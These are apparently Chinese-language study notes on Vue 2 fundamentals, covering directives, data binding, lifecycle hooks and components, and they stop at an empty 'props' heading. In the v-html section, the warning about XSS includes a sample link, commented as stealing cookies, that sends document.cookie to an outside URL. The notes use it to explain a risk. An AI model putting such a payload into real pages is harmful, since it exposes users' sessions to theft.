# Vue2 Basic

## Vue簡介
- Vue是一套用於建構用戶介面的漸進式JavaScript框架（ie. 將數據變成用戶可視的界面）

- Vue的特點：
    1. 採用組件化模式，提高代碼複用率和更好維護
        在一個 .vue 裏面就是一個組件，包含 html/css/js
    2. 聲明式編碼，無需直接操作DOM，提高開發效率
        聲明式編碼 vs 命令式編碼
            命令式編碼：清楚列明每一個操作步驟
            聲明式編碼：用語法直接讓React佢操作DOM
    3. 使用虛擬DOM + 優秀的Diff算法，儘量複用DOM節點



## Vue操作
- Vue操作：
    1. 想讓Vue工作，就必須創建一個Vue實例，且要傳入一個配置對象
    2. root容器中的代碼依然符合html規範，只不過混入了一些特殊的Vue語法
    3. root容器中的代碼被稱為 "Vue模板"
    4. Vue實例和容器是<font color="#f54747">一對一</font>的
    5. 真實開發中有一個Vue實例，並且會配合著組件一起使用
    6. `{{xxx}}`中的`xxx`要寫JS表達式，且`xxx`可以自動讀取`data`中的所有屬性
    7. 一旦data中的數據發生改變，那麼頁面中用到該數據的地方也會自動更新


- 具體代碼：
    ```html
    <!-- 引入Vue -->
    <script src="../vue_basic/vue.js"></script>
    <!-- 準備一個容器 -->
    <div id="demo">
        <h1>Hello {{name}}, {{address}}</h1>
    </div>
    ```
    ```js
    // 創建Vue實例
    new Vue({
        el:'#demo',      // element 用於指定當前Vue實例為哪個容器服務，值通常為css選擇棄字符串
        data:{ // data中用於存儲數據，數據共el所指定的容器去使用，值暫時先寫成一個對象
            name:'Donald',
            gender: 'M'
        }
    });
    ```


- 注意區分：<font color="#f54747">JS表達式</font> 和 <font color="#f54747">JS代碼/語句</font>
    - JS表達式：一個表達式會生成一個值，可以放在任何一個地方
        1. `a`
        2. `a+b`
        3. `demo(1)`
        4. `x === y ? 'a' : 'b'`
    - JS語句：
        1. `if(){}`
        2. `for(){}`



## 模塊語法
1. 插值語法：
    功能：用於解析標籤體的內容
    寫法：`{{xxx}}`, `xxx`是JS表達式，且可以直接讀取到`data`中的所有屬性
    ```vue
    <h3>Hello, {{name}}</h3>
    ```


2. 指令語法：
    功能：用於解析標籤 (包括：標籤屬性、標籤體內容、綁定時間...)
    舉例：`v-bind:href="xxx"` 或 簡寫為 `:href="xxx"`, `xxx`同為JS表達式，且可以直接讀取到`data`中的所有屬性
    備註：Vue中有很多的指令，且形式都是: `v-yyy`
    ```vue
    <a v-bind:href="link.url" x="hello">Go To {{link.name}}</a>
    <a :href="link.url" x="hello">Go To {{link.name}} 2</a>
    ```


- Vue實例
    ```js
    new Vue({
        el:'#demo',
        data:{
            name:'Donald',
            link:{
                name:'Google',
                url:'http://www.google.com'
            }
        }
    });
    ```



## 數據綁定
1. 單向數據綁定(`v-bind`)：數據只能從`data`流向頁面
    ```vue
    <!-- 全寫 -->
    <input type="text" v-bind:value="name">
    <!-- 簡寫 -->
    <input type="text" :value="name">
    ```


2. 雙向數據綁定(`v-model`)：數據不僅能從data流向頁面，還可以從頁面留向`data`
    - 雙向綁定一般都應用在表單類元素上 (如：`input`、`select`等)
    - `v-model:value`可以簡寫為`v-model`，因為`v-model`默認收集的就是`value`值
    ```vue
    <!-- 全寫 -->
    <input type="text" v-model:value="name">
    <!-- 簡寫 -->
    <input type="text" v-model="name">
    ```



## el和data寫法
1. `el`的兩種寫法：
    1. `new Vue`時配置`el`的屬性
    2. 先創建Vue實例，隨後再通過 `vm.$mount('#root')`指定`el`的值


2. `data`的兩種寫法：
    1. 對象式
        ```js
        data:{
            name:'Donald'
        }
        ```

    2. 函數式<font color="#f54747">（推薦使用，因為後續會報錯）</font>
        備註：由Vue管理的函數，<font color="#f54747">一定不要寫箭頭函數</font>，一旦寫了箭頭函數，`this`就不再是Vue實例了
        ```js
        data(){
            return{
                name:'Donald'
            }
        }
        ```



## MVVM模型
1. MVVM模型：
    <img src="https://p.ipic.vip/5hwti8.jpg" width="600px"/>
    1. M：模型(Model)：對應data中的數據
    2. V：視圖(View)：模板
    3. VM：視圖模型(ViewModel)：Vue實例對象
        - 而在文檔中經常會使用 `vm`(ViewModel) 這個變量名來表示Vue實例


2. 觀察發現：
    1. `data`中所有的屬性，最後都出現在`vm`身上
    2. `vm`身上的所有屬性 及 Vue原型上的所有屬性，在Vue模板中都可以直接使用



## 數據代理
1. `defineProperty`方法
    ```js
    Object.defineProperty(person, 'age', {
        value:18,
        enumerable:true,       // 控制屬性是否可以枚舉，默認值為false
        writable:true,         // 控制屬性是否可以被修改，默認值為false
        configurable:true,     // 控制屬性是否可以被刪除，默認值為false
    
        // 當有人讀取person的age屬性時，get函數(getter)就會被調用，且返回值就是age的值
        get(){
            return number
        },
        // 當有人修改person的age屬性時，set函數(setter)就會被調用，且會收到修改的具體值
        set(value){
            number = value
        }
    })
    ```


2. 數據代理
    1. Vue中的數據代理：
        - 通過`vm`對象來代理`data`對象中屬性的操作(讀/寫) (getter/setter)

    2. Vue中的數據方法：
        - 更加方便的操作`data`中的數據

    3. 基本原理：
        - 通過`Object.defineProperty()`方法把`data`對象中所有屬性添加到`vm`上
        - 為每一個添加到vm的屬性，都指定一個`getter`和`setter`
        - 在`getter`/`setter`內部去操作(讀/寫)`data`中響應的屬性



## 事件處理

### 事件的基本使用
1. 使用`v-on:xxx`或`@xxx`綁定事件，其中`xxx`是事件名
    ```vue
    <!-- 不傳遞參數 -->
    <button @click="funct"></button>
    <!-- 傳遞參數 -->
    <button @click="funct(parameters)"></button>
    ```


2. 事件的回調需要配置在`methods`對象中，最終會在`vm`上
    ```js
    methods:{
        funct(){}
    }
    ```


3. `methods`中配置的函數，<font color="#f54747">不要用箭頭函數</font>，否則this就不是vm了

4. `methods`中配置的函數，都是被Vue所管理的函數，`this`的指向是`vm`或組件實例對象

5. `@click="demo"`和`@click="demo($event)"`效果一致，但後者可以傳参



### 事件修飾符
1. `prevent`：阻止默認事件
2. `stop`：阻止事件冒泡
3. `once`：事件只出發一次
4. `capture`：使用事件的捕獲模式
5. `self`：只有`event.target`是當前操作的元素時才觸法事件
6. `passive`：事件的默認行為立即執行，無需等到事件回調執行完畢
    ```vue
    <button @click.xxx="funct(parameters)"></button>
    ```
    備註：修飾符可以連續寫，例如`@click.prevent.stop`先阻止默認事件，再阻止冒泡



### 鍵盤事件
1. Vue中常用的按鍵別名：
    `enter`、`delete`、`esc`、`space`、`tab` (特殊，必須配合keydown去使用)、`up`、`down`、`left`、`right`
    ```vue
    <input type="text" @keyup.enter="funct">
    ```


2. Vue未提供別名的按鍵，可以使用按鍵原始的key值去綁定，但注意要轉為`kebab-case`(短橫線命名)


3. 系統修飾鍵（用法特殊）：`ctrl`、`alt`、`shift`、`meta`
    - 配合`keyup`使用：按下修飾鍵的同時，再按下其他鍵，隨後釋放其他鍵，事件才會觸發
    - 配合`keydown`使用：正常觸發事件
        ```vue
        <input type="text" @keyup.ctrl.y="funct">
        ```


4. 也可以使用`keyCode`去指定具體的按鍵（不推薦）


5. `Vue.config.keyCodes.自定義鍵名 = 鍵碼`，可以去定製按鍵別名



## 計算屬性
1. 定義：要用的屬性不存在，要通過「已有的屬性 (並非已有的隨便一個變量)」計算得來


2. 原理：底層借助了`Object.defineProperty`方法提供的`getter`和`setter`


3. `get`函數的執行時間：
    - 初次讀取時會執行一次
    - 當依賴的數據發生改變時會被再次調用


4. 優勢：與`methods`實現相比，內部有緩存機制(複用)，效率更高，調試方便


5. 備註：
    1. 計算屬性最終會出現在`vm`上，可直接讀取使用
    2. 如果計算屬性要被修改，那必須寫`set`函數去響應修改，且`set`中要引起計算時依賴的數據發生
    3. 如果只考慮讀取、不考慮改寫，可以使用簡寫方法，但因為是計算屬性不是`method`，因此不要加()


6. 具體代碼：
    ```js
    computed:{
        // 完整寫法：
        fullName:{
            get(){
                return this.firstName + '-' + this.lastName     // 被調用的屬性即是依賴的屬性
            },
            set(value){
                const arr = value.split('-');
                this.firstName = arr[0];
                this.lastName = arr[1];
            }                    
        }
    
        // 簡寫
        fullName(){
            return this.firstName + '-' + this.lastName
        }
    }
    ```



## 綁定樣式

### class樣式
- 語法：`:class="xxx"`，`xxx`可以是字符串、數組和對象


1. 字符串寫法
    - 適用於：類名不確定，要動態獲取
        ```vue
        <!-- 綁定class樣式 -- 字符串寫法，適用於：樣式的類名不確定，需要動態決定 -->
        <div :class="mood" @click="changeMood">{{name}}</div><br>
        ```
        ```js
        mood: 'normal'
        ```


2. 數組寫法
    - 適用於：要綁定多個樣式，個數確定，名字也確定
        ```vue
        <!-- 綁定class樣式 -- 數組寫法，適用於：要綁定的樣式個數不確定、名字也不確定 -->
        <div :class="classArr">{{name}}</div><br>
        ```
        ```js
        classArr:['a1', 'a2', 'a3'],
        ```


3. 對象寫法
    - 適用於：要綁定多個樣式，個數不確定、名字也不確定
        ```vue
        <!-- 綁定class樣式 -- 對象寫法，適用於：要昂丁的樣式個數確定、名字也確定，但要動態決定用不用 -->
        <div :class="classObj">{{name}}</div><br>
        ```
        ```js
        classObj:{ a1:false, a2:false, a3:true },
        ```



### style樣式
1. 對象寫法
    - 語法：`:style="{fontSize: xxx}"` 其中`xxx`是動態值
        ```vue
        <!-- 綁定style樣式 -- 對象寫法 -->
        <div :style="styleObj">{{name}}</div><br>
        ```
        ```js
        styleObj:{
            fontSize: '40px',
            color: 'red',
            backgroundColor: 'orange',
        },
        ```


2. 數組寫法
    - 語法：`:style="[a,b]"` 其中a,b是樣式對象
        ```vue
        <!-- 綁定style樣式 -- 數組寫法，不常用 -->
        <div :style="styleArr">{{name}}</div><br>
        ```
        ```js
        styleArr:[
            {
                fontSize: '40px',
                color: 'red',
            },
            {
                backgroundColor: 'orange',
            },
        ],
        ```



## 條件渲染
1. `v-if`
    - 適用於：切換頻率比較低的場景
    - 特點：<font color="#f54747">不展示的DOM元素會被直接移除</font>
    - 注意：`v-if`可以和`v-else-if`, `v-else`一起使用，但要求結構不能被「打斷」
    - 具體代碼：
        ```vue
        <div v-if="n === 1">Angular</div>
        <div v-else-if="n === 2">React</div>
        <div v-else-if="n === 3">Vue</div>
        <div v-else>haha</div>
        ```

2. `v-show`
    - 適用於：切換頻率較高的場景
    - 特點：不展示的DOM元素不會被移除，僅僅是使用樣式隱藏
    - 具體代碼：
        ```vue
        <h2 v-show="false">Hello</h2>
        <h2 v-show="1 === 1">Hello</h2>
        ```


3. 備註：使用`v-if`時，元素可能無法獲取到，而使用`v-show`一定可以獲取到



## 列表渲染 `v-for`
1. 簡介：
    - 用於展示列表數據
    - 可遍歷：數組、對象、字符串、指定次數
    - 語法：`v-for="(item, index) in obj" :key="index"`


2. 遍歷數組
    ```vue
    <li v-for="(p,index) in persons" :key="index">
        {{p.name}}-{{p.age}} -- {{index}}
    </li>
    ```
    ```js
    new Vue({
        data:{
            persons:[
                {id:'001', name:'Donald', age:19},
                {id:'002', name:'John', age:20},
                {id:'003', name:'Jack', age:21},
            ],
        }
    })
    ```


3. 遍歷對象
    ```vue
    <li v-for="(value,k) in car" :key="k">
        {{k}} -- {{value}}
    </li>
    ```
    ```js
    new Vue({
        data:{     
            car:{
                name:'Porsche',
                price:'10M',
                color:'Black'
            },
        }
    })
    ```


4. 遍歷字符串（少用）
    ```vue
    <li v-for="(char,index) in str" :key="index">
        {{char}}
    </li>
    ```
    ```js
    str:'Hello'
    ```


5. 遍歷指定次數（少用）
    ```vue
    <li v-for="(number,index) in 10" :key="index">
        {{number}} - {{index}}
    </li>
    ```



## key的內部原理
1. 虛擬DOM中`key`的作用：
    - key是虛擬DOM對象的標識，當狀態中的數據發生變化時，Vue會根據「新數據」生成「新的虛擬DOM」
    - 隨後Vue進行「新虛擬DOM」與「舊虛擬DOM」的差異比較(diff Algorithm)


2. Diff Algorithm 對比規則：
    - 舊虛擬DOM中<font color="#f54747">找到</font>與新虛擬DOM相同的`key`
        1. 若虛擬DOM中內容<font color="#f54747">沒變</font>，直接使用之前的真實DOM
        2. 若虛擬DOM中內容<font color="#f54747">有變</font>，則聲稱新的真實DOM，隨後替換掉頁面中之前的真實DOM
    
    - 舊虛擬DOM中<font color="#f54747">找不到</font>與新虛擬DOM相同的`key`
        - 創建新的真實DOM，隨後渲染到頁面


3. 用`index`作為`key`可能引發的問題：
    1. 若對數據進行：逆序添加、逆序刪除等破壞順序的操作：
        - 會產生沒有必要的真實DOM更新 => 界面效果沒問題，但效率低

    2. 如果結構中還包括輸入類的DOM：
        - 會產生錯誤DOM更新 => 介面有問題


4. 開發中如何選擇`key`：
    1. 最好使用每條數據的唯一標識作為`key`，比如`id`、手機號碼、身分證號碼、學生證號碼等唯一值
    2. 如果<font color="#f54747">不存在對數據的逆序添加、逆序刪除等破壞順序的操作，僅用於渲染列表用於展示</font>
        - 使用`index`作為`key`是沒有問題的



## Vue監測原理
1. 更新時的問題：
    ```vue
    <li v-for="(p,index) in persons" :key="p.id">
        {{p.name}}-{{p.age}}
    </li>
    ```
    - 當數據是保存在一個對象裡，如果直接修改對象數據，則頁面也會更新數據
        ```js
        this.persons[0].name = 'Donald'
        ```

    - 然而，如果修改整個對象，則頁面<font color="#f54747">不會更新數據</font>
        ```js
        this.persons[0] = {id:'001', name:'Donald', age:50}
        ```


2. Vue監測對象中的數據：
    - 通過`setter`實現監視，且要再`new Vue`時就傳入要監測的數據
    - 對象中後追加的屬性，Vue默認不做響應式處理<font color="#f54747">（後追加的屬性並沒有添加`setter`）</font>
    - 如需要給後添加的屬性做響應式，則需要使用一下API：
        1. `Vue.set(target, key, value)`
        2. `vm.$set(target, key, value)`
    - 具體代碼：
        ```js
        methods:{
            addGender(){
                Vue.set(this.students, 'gender', 'M')
                this.$set(this.students, 'gender', 'M')
            }
        }
        ```


3. Vue監測數組中的數據：
    - 通過包裹數組更新元素的方法實現，本質包裹裡就做了兩件事：
        1. 調用原生對應的方法對數組進行更新
        2. 重新解析模板，進而更新頁面


4. 在Vue修改數組中的某個元素一定要用如下方法：
    - 使用以下API：`push()`, `pop()`, `shift()`, `unshift()`, `splice()`, `sort()`, `reverse()`
    - `Vue.set()` 或 `vm.$set`


5. 備註：<font color="#f54747">`Vue.set()`和`vm.$set`不可以給`vm`或`vm`的跟數據對象 添加屬性！！！</font>



## 收集表單數據
1. Vue對輸入框數據的收集：
    1. `<input type="text"/>`
        - `v-model`收集的是`value`值，而用戶輸入的就是`value`值

    2. `<input type="radio"/>`
        - `v-model`收集的是`value`值，而要給標籤配置`value`值

    3. `<input type="checkbox"/>`
        - 如果沒有配置`input`的`value`屬性
            - 則`v-model`收集的是`checked`的布爾值

        - 如果有配置`input`的`value`屬性
            1. `v-model`的初始值是非數組，那麼收集的就是`checked`的布爾值
            2. `v-model`的初始值是數組，那麼收集的就是`value`組成的數組


2. `v-model`的三個修飾符：
    1. `lazy`：失去焦點再收集數據
    2. `number`：輸入字符串轉為有效數字
    3. `trim`：輸入收尾空格過濾
    - 語法：
        ```vue
        <!-- 失去焦點時，userInfo.other收集輸入框數據 -->
        <textarea v-model.lazy="userInfo.other"></textarea>
        ```



## 過濾器（已刪除）
1. 定義：對要顯示的數據進行特定的格式化後再顯示


2. 語法：
    1. 註冊過濾器：`Vue.filter(name, callback)` 或 `new Vue(filters:{})`
    2. 使用過濾器：`{{xxx | filterName}}` 或 `v-bind:屬性="xxx | filterName"`


3. 備註：
    1. 過濾器可以接受額外參數，多個過濾器也可以串連
    2. 並沒有改變原本的數據，會產生新的對應數據



## Vue內置指令
1. `v-text`
    - 作用：向其所在的節點中渲染文本內容

    - 與插值語法的區別：<font color="#f54747">`v-text`會替換掉節點中的內容，插值語法則不會</font>

    - 具體代碼：
        ```vue
        <div v-text="'Hello, ' + name"></div>
        
        <script>
        new Vue({
            data:{
                name:'Donald'
            },
        })
        </script>
        ```


2. `v-html`
    - 作用：向指定節點中渲染包含html結構的內容

    - 與插值語法的區別：
        1. `v-html`會替換掉節點中的所有內容
        2. `v-html`可以識別`html`結構

    - <font color="#f54747">嚴重注意：v-html有安全性問題：</font>
        1. 在網站上動態渲任意HTML是非常危險的，容易導致XSS攻擊
        2. 一定要在可信的內容上使用v-html，永遠不要再用戶提交的內容上使用

    - 具體代碼：
        ```vue
        <div v-html="str"></div>
        <div v-html="str2"></div>
        
        <script>
        new Vue({
            data:{
                str: '<h3>Hello World</h3>',
                // 竊取用戶cookie
                str2: '<a href=javascript:location.href="http://www.google.com?" + document.cookie>Click Me</a>'
            },
        })
        </script>
        ```


3. `v-cloak`
    - 作用：
        - 本質是一個特殊屬性，Vue實例創建完畢並接管容器後，會刪除`v-cloak`屬性
        - 使用css配合`v-cloak`可以解決網速慢時頁面展示出的`{{xxx}}`問題
    
    - 具體代碼：
        ```vue
        <style>
            [v-cloak]{
                /* 避免出現的樣式丟失問題 */
                display: none;
            }
        </style>
        ```


4. `v-once`
    - 作用：
        - `v-once`所在節點在初次動態渲染後，就視為靜態內容了
        - 以後數據的改變不會引起`v-once`所在結構的更新，可以用於優化性能
    
    - 具體代碼：
        ```vue
        <!-- {{n}}變成靜態內容 -->
        <h2 v-once>initialized value of n = {{n}}</h2>
        ```


5. `v-pre`
    - 作用：
        - 跳過其所在節點的編譯過程
        - 可以利用它跳過：沒有使用指令語法、沒有使用插值語法的節點，會加快編譯
    
    - 具體代碼：
        ```vue
        <!-- {{n}}被跳過，不會動態渲染 -->
        <h2 v-pre>current value of n = {{n}}</h2>
        ```



### 自定義指令
1. 定義語法：
    1. 局部指令：
        ```js
        new Vue({
            directives:{指令名:配置對象}
        })
        new Vue({
            directives(){指令名:回調函數}
        })
        ```
        - 案例：
            ```vue
            <!-- 案例: 定義一個v-enlarge指令，和v-text功能類似，會把綁定的數值放大10倍 -->
            <h2>10n = <span v-enlarge="n"></span></h2>
            
            <script>
            new Vue({
                directives:{
                    enlarge(element,binding){
                        element.innerText = binding.value * 10
                    },
                }
            })
            </script>
            ```
        
    2. 全局指令：
        ```js
        Vue.directive('指令名', 配置對象)
        Vue.directive('指令名', 回調函數)
        ```


2. 配置對象中常用的3個回調：
    1. `bind`：指令與元素成功綁定時
    2. `inserted`：指令所在元素被插入頁面時
    3. `update`：指令所在模板結構被重新解析時
    - 案例：
        ```vue
        <!-- 需求2: 定義一個v-fbind指令，和v-bind功能類似，但可以讓所綁定的input元素默認獲取焦點 -->
        <input type="text" v-fbind:value="n">
        
        <script>
        new Vue({
            directives:{
                fbind:{
                    // 指令與元素成功綁定時（初次）
                    bind(element, binding){
                        element.value = binding.value
                    },
                    // 指令所在元素在插入頁面時
                    inserted(element, binding){
                        element.focus()
                    },
                    // 指令所在的模板被重新解析時
                    update(element, binding){
                        element.value = binding.value
                    }
                }
            }
        })
        </script>
        ```

3. 備註：
    1. 指令定義時不加`v-`，但使用時要加`v-`:
    2. 指令名如果是多個單詞，要使用 kebab-case 命名方式，不要用 camelCase 命名方式



## 生命週期
1. 簡介：
    - Vue在關鍵時刻幫我們調用的一些特殊名稱的函數
    - 生命週期函數的名字不可更改，但函數的具體內容是程序員根據要求編寫的
    - 生命週期函數中的`this`指向是`vm`或組件實例對象
    - 生命週期：`beforeCreate` -> `created` -> `beforeMount`  -> `mounted`  -> `beforeUpdated`  -> `updated`  -> `beforeDestoryed`  -> `destoryed`
    - 圖示：
      <img src="https://p.ipic.vip/jmyx89.png" width="600px"/>



2. 分析聲明週期：
    1. `beforeCreate()`
        - 初始化：生命週期、事件
        - 無法通過`vm`訪問`data`中的數據和`methods`中的方法

    2. `created()`
        - 初始化：數據監聽、數據代理
        - 可以通過`vm`訪問`data`中的數據和`methods`中的方法

    3. `beforeMount()`
        - 解析模板，生成虛擬DOM，此時頁面還<font color="#f54747">不能顯示解析好的內容</font>
        - 頁面呈現的是<font color="#f54747">未經Vue編譯的DOM結構</font>
        - 所有對DOM的操作，最終都沒有效果

    4. `mounted()`
        - 將內存中的 虛擬DOM 轉為 真實DOM 插入頁面
        - 頁面呈現的是<font color="#f54747">經過Vue編譯的DOM結構</font>
        - 一般在此進行：開始定時器、發送網絡請求、綁定自定義事件等初始化操作

    5. `beforeUpdate()`
        - 此時數據是新的，但是頁面是舊的，<font color="#f54747">數據和頁面尚未保持同步</font>

    6. `updated()`
        - 根據新數據生成新的虛擬DOM，隨後與舊的虛擬DOM進行`diff`算法比較，最終更新頁面
        - 此時數據和頁面都是新的，<font color="#f54747">數據和頁面同步</font>

    7. `beforeDestroyed()`
        - 此時`vm`中的所有`data`、`methods`都是可用的，但<font color="#f54747">不會進行頁面的更新</font>
        - 一般在此進行：關閉定時器等收尾操作

    8. `destroyed()`
        - 刪除所有內置的數據監聽和數據代理



3. 常用生命週期鉤子：
    1. `mounted()` 
        - 發送`ajax`請求、啟動定時器、綁定自定義事件、訂閱消息等<font color="#f54747">初始化操作</font>
    2. `beforeDestroy()`
        - 清除定時器、解綁自定義事件、取消訂閱信息等<font color="#f54747">收尾工作</font>



4. 關於銷毀Vue實例：
    1. 銷毀後借助Vue的開發者工具看不到任何信息
    2. 銷毀後自定義事件會失效，但<font color="#f54747">原生DOM事件依然有效</font>
    3. 一般不會在`beforeDestroy`操作數據，因為即便操作數據，也不會觸發更新流程



## 組件化編程
1. 傳統方式編寫應用：
    1. 案例一、頂部、導航、內容、底部
        - 結構：
            - 1個HTML，負責頁面結構
            - 添加引入4個CSS，負責管理不同區域
            - 添加引入4個JS，負責各個區域的交互

    2. 案例二、頂部、商品列表、底部
        - 結構：
            - 1個新的HTML，「複製貼上」案例一中 頂部與底部的結構，並添加商品列表的結構
            - 引入案例一中重複的頂部與底部CSS樣式
            - 引入案例一中重複的頂部與底部JS
            - 添加引入1個CSS樣式和JS交互，負責商品列表區域

    3. 存在問題：
        1. 依賴關係混亂、不好維護
        2. 代碼複用率不高



2. 組件方式編寫應用：
    1. 案例一、頂部、導航、內容、底部
        - 分開四個不同組件：
            - `header`組件，包含：實現頂部功能所對應的樣式(CSS)、結構(HTML片斷)及交互(JS)
            - `navigator`組件
            - `content`組件
            - `footer`組件

    2. 案例二、頂部、商品列表、底部
        - 把重複應用的組件引入
        - 再新增`list`組件，裏面包含實現其功能的樣式、結構及交互，並且包含獨特的，如字體、音頻等



3. 組件化編程思路：
    1. 拆分靜態組件：組件按照<font color="#f54747">功能點</font>拆分，命名不要與html元素衝突

    2. 實現動態組件：考慮好數據存放的位置，數據是一個組件在用，還是一些組件在用：
        - 一個組件在用：放在組件自身即可
        - 多個組件在用：放在他們共同父組件上（狀態提升）

    3. 實現交互：從綁定事件開始



4. 組件與模塊：
    1. 模塊
        - 定義：向外提供特定功能的JS程序
        - 原因：JS文件很多很複雜
        - 作用：複用JS、簡化JS編程，提高JS運行效率
    
    2. 組件
        - 定義：實現應用中<font color="#f54747">局部功能代碼和資源的集合</font>
        - 原因：一個界面的功能很複雜
        - 作用：複寫編碼、簡化項目編碼，提高運行效率



5. 組件化與模塊化
    1. 模塊化
        - 當應用中的JS以模塊化形式編寫的，那這個應用就是一個模塊化的應用（把JS按模塊化的標準拆分）

    2. 組件化
        - 當應用中的功能都是多組件的方式來編寫的，那這個應用就是一個組件化的應用（按照不同功能點來拆分）



## 非單文件組件
1. Vue中使用組件的三大步驟：
    1. 定義一個組件：
        - 使用`Vue.extend(options)`創建
            - `options`和`new Vue(options)`時傳入的那個`options`幾乎一樣
            - 區別：
                1. `el`不要寫，因為最終所有組件都要經過一個`vm`管理，由`vm`中的`el`決定服務哪個容器
                2. `data`必須寫成函數`data(){return{}}`，避免組件被複用時數據存在引用關係（儲存為同一地址）
            - 備註：使用`template`可以配置組件結構
            ```js
            const student = Vue.extend({
                template:`
                    <div>
                        <h2>Student Name: {{studentName}}</h2>
                        <h2>Student Address: {{age}}</h2>
                    </div>
                `,
                data:function(){
                    return {
                        studentName:'Donald',
                        age:19
                    }
                }
            })
            ```

    2. 註冊組件：
        1. 局部註冊：靠`new Vue`的時候傳入`components`選項
            ```js
            new Vue({
                el:'#root',
                components:{
                    school,
                    student
                }
            })
            ```

        2. 全局註冊：靠`Vue.component('組件名', 組件)`
            ```js
            Vue.component('school', school)
            ```

    3. 使用組件（組件標籤）
        ```vue
        <組件名></組件名>
        <school></school>
        ```



2. 使用組件注意事項
    1. 組件命名方式：
        1. 一個單詞組成：
            - 第一種寫法：首字母大寫`School`
            - 第二種寫法：首字母小寫`school`

        2. 多個單詞組成：
            - 第一種寫法：kebab-case命名`my-school`
            - 第二種寫法：CamelCase命名`MySchool`（需要Vue腳手架支持）

        3. 備註：
            - 組件名儘可能迴避HTML中已有的元素名稱，例如`h2`、`H2`
            - 可以使用`name`配置項指定組件在開發者工具中呈現的名字

    

    2. 組件標籤寫法：
        a. `<school></school>`
        b. `<school/>`    (不使用腳手架時，`<school/>`標籤會導致後續組件不能渲染)

    

    3. 簡寫方式：
        `const school = Vue.extend(options)`可簡寫為`const school = options`
        ```js
        const school = {
            name:'School',
            template:`
                <div>
                    <h2>School Name: {{schoolName}}</h2>
                    <h2>School Address: {{address}}</h2>
                </div>
            `,
            data(){
                return{
                    schoolName:'CUHK',
                    address:'Tai Po'
                }
            }
        }
        ```



3. 組件嵌套
    - 在組件內傳入`components`選項
        ```js
        // 定義 student 組件
        const student = {
            template:`
                <div>Student</div>
            `,
        }
        // 定義 school 組件
        const school = {
            template:`
                <div>
                    <student></student>
                </div>
            `,
            components:{
                student
            }
        }
        // 定義 app 組件
        const app = {
            template:`
                <div>
                    <school></school>
                </div>
            `,
            components:{
                school,
            }
        }
        new Vue({
            el:'#root',
            template:`
                <app></app>
            `,
            // 註冊組件(局部)
            components:{app}
        })
        ```



4. `VueComponent`
    1. `school`組件本質是一個名為`VueComponent`的<font color="#f54747">構造函數</font>，且不是程序員定義的，是`Vue.extend`生成的

    2. 我們只需要寫`<school></school>`，Vue解析時會幫我們創建`school`組件的實例對象
        - 即Vue會幫我們執行：`new VueComponent(options)`

    3. 特別注意：<font color="#f54747">每次調用`Vue.extend`時，返回的都是一個全新的`VueComponent`！！！</font>

    4. `this`指向：
        - 組件配置中：
            - `data`函數、`methods`中的函數、`watch`中的函數、`computed`中的函數
                他們的`this`都是<font color="#f54747">VueComponent實例對象</font>

        - `new Vue(options)`配置中：
            - `data`函數、`methods`中的函數、`watch`中的函數、`computed`中的函數
                他們的`this`都是<font color="#f54747">Vue實例對象 === vm</font>

    5. `VueComponent`的實例對象，簡稱`vc`。Vue的實例對象，簡稱`vm`



5. 內置關係：
    - 一個重要的內置關係：`VueComponent.prototype.__proto__ === Vue.prototype`
    - 原因：讓組件實例對象(vc)，也能訪問到Vue原型上的屬性和方法



## 單文件組件
1. 創建`index.html`文件
    ```html
    <body>
        <div id="root"></div>
        <!-- 引入Vue.js -->
        <script src="../vue_basic/vue.js"></script>
        <!-- 引入入口文件 -->
        <script src="./main.js"></script>
    </body>
    ```


2. 配置`main.js`入口文件
    ```js
    import App from './App.vue'
    
    new Vue({
        el:'#root',
        template:`<App></App>`,
        components:{App}
    })
    ```


3. 配置`App`組件
    ```vue
    <template>
        <div>
            <School/>
        </div>
    </template>
    
    <script>
        // 引入組件
        import School from './School.vue'
    
        // 暴露App組件
        export default {
            name:'App',
            components:{
                School,
            }
        }
    </script>
    ```


4. 配置`School`組件
    ```vue
    <!-- 組件的結構 -->
    <template>
        <div class="demo">
            <h2>School Name: {{name}}</h2>
            <button @click="showName">Show Name</button>
        </div>
    </template>
    
    <!-- 組件交互相關的代碼 -->
    <script>
        export default {
            name:'School',
            data(){
                return{
                    name:'CUHK',
                }
            },
            methods:{
                showName(){
                    alert(this.name)
                }
            },
        } 
    </script>
    
    <!-- 組件的樣式 -->
    <style>
        .demo{
            background-color: orange;
        }
    </style>
    ```


5. 注意：此時開啟`index.html`文件頁面沒有任何小效果，因為沒有配置Vue腳手架



# Vue-cli

## 腳手架的文件結構
    |—— node_modules
    |—— public
    |     |—— favicon.ico 頁籤圖標
    |     |—— index.html 主頁面
    |
    |—— src
    |    |—— assets 存放靜態資源
    |    |     |—— logo.png
    |    |
    |    |—— components 存放組件
    |    |        |—— HelloWorld.vue
    |    |
    |    |—— App.vue 匯總所有組件
    |    |—— main.js 入口文件
    |
    |—— .gitignore git版本管制忽略的配置
    |—— babel.config.js babel的配置文件
    |—— package.json 應用包配置文件
    |—— README.md 應用描述文件
    |—— package-lock.json 包版本控制文件



## vue.config.js 配置文件
使用`vue inspect` > `output.js`可以查看到Vue腳手架的默認配置
使用`vue.config.js` 可以對腳手架進行個性化定制



## ref屬性
1. 被用來給 元素 或 子組件 註冊引用信息（id的替代者）

2. 應用在html標籤上獲取的是<font color="#f54747">真實DOM元素</font>
   應用在組件標籤上則是<font color="#f54747">組件的實例對象(vc)</font>

3. 使用方式：
    - 標識：`<h1 ref="xxx"></h1>` 或 `<School ref="xxx"></School>`
    - 獲取：`this.$refs.xxx`



## 混入mixin
1. 功能：可以把多個組件共同的配置提取成一個混入對象

2. 使用方式：
    1. 定義：
        ```js
        export default xxx{
            data(){...}
            methods:{...}
            ...
        }
        ```
    2. 使用：
        1. 全局混入：
            ```js
            Vue.mixin(xxx)
            Vue.mixin(yyy)
            ```

        2. 局部混入：
            ```js
            mixins:['xxx', 'yyy']
            ```

    3. 備註：
        - 如果混入的屬性與函數和組件裡的重名，則使用組件的屬性與函數
        - 如果混入的是組件函數，則都會執行，例如：`mounted()`



## 插件plugins
1. 功能：用於增強Vue

2. 本質：包含`install(Vue, options)`方法的一個對象
    第一個參數：Vue
    第二個以後的參數：插件使用者傳遞的數據

3. 定義插件：
    ```js
    obj.install = function(Vue, options){...}
    ```

4. 使用插件：
    ```js
    Vue.use(xxx)
    ```



## scoped樣式
1. 作用：讓樣式在局部生效，防止衝突

2. 寫法：`<style scoped>`

3. 具體代碼；
    ```vue
    <style scoped lang="less">
        .demo{
            background-color: orange;
            color: aqua;
            .less_test{
                font-size: 40px;
            }
        }
    </style>
    ```



## 配置項props
